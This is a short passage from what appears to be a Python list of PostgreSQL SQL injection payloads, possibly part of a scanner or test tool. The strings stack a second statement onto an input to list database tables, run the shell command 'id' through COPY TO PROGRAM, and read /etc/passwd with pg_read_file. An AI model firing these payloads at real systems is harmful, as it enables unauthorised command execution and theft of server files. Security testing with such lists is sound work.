        "'; SELECT tablename FROM pg_catalog.pg_tables LIMIT 5-- -",
        
        # File operations (usually restricted)
        "'; COPY (SELECT '') TO PROGRAM 'id' WHERE 1=0-- -",
        "'; SELECT pg_read_file('/etc/passwd',0,100) WHERE 1=0-- -",
        
        # Multiple statements
